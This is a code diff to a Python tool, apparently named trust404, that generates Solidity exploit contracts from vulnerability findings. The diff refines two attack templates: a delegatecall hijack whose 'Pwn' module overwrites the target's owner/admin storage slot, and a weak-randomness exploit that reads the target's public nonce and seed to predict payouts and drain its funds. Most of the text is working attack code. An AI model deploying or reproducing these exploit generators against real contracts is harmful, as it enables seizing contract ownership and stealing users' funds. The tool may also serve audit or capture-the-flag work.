@@ -239,17 +239,25 @@ def _delegatecall(findings):
             call_args.append("0")
     sig_types = ",".join(parts)
     call = f"        t.{name}({', '.join(call_args)});"
+    slot = 0
+    try:
+        from trust404.layout import privileged_slot, pwn_hijack
+        slot = privileged_slot(findings.get("src") or "")
+        pwn_body = pwn_hijack(slot)
+    except Exception:
+        pwn_body = (
+            "    address public slot0;\n"
+            "    function hijack() external { slot0 = msg.sender; }\n"
+        )
     body = (
         "// Strategy: delegatecall hijack — the target delegatecalls a module\n"
         "// we control, so our module runs in the target's storage context and\n"
-        "// overwrites slot 0 (owner/admin). No import needed.\n"
+        f"// overwrites slot {slot} (owner/admin). No import needed.\n"
         "interface ITarget {\n"
         f"    function {name}({sig_types}) external;\n"
         "}\n\n"
         "contract Pwn {\n"
-        "    // slot 0 aligns with the target's owner/admin slot under delegatecall\n"
-        "    address public slot0;\n"
-        "    function hijack() external { slot0 = msg.sender; }\n"
+        + pwn_body +
         "}\n\n"
         "contract Exploit {\n"
         "    function run(address _t) external payable {\n"
@@ -300,12 +308,21 @@ def _randomness(findings):
     else:
         pick = f"({rand_expr})"
         param = "uint256"
+    getters = []
+    try:
+        from trust404.layout import rewrite_mixed
+        pick, getters = rewrite_mixed(pick, findings.get("src") or "", obj="t")
+    except Exception:
+        getters = []
+    getter_ifaces = "".join(
+        f"    function {g}() external view returns (uint256);\n" for g in getters
+    )
     body = (
         "// Strategy: weak randomness — the payout is decided by block entropy\n"
-        "// the caller can read in the same transaction. We compute the exact\n"
-        "// same value and submit it as our guess, draining the house float.\n"
+        "// mixed with public nonce/seed we read off the target in the same tx.\n"
         "interface ITarget {\n"
         f"    function {name}({param} guess) external payable;\n"
+        + getter_ifaces +
         "}\n\n"
         "contract Exploit {\n"
         f"    uint256 constant ANTE = {ante};\n"
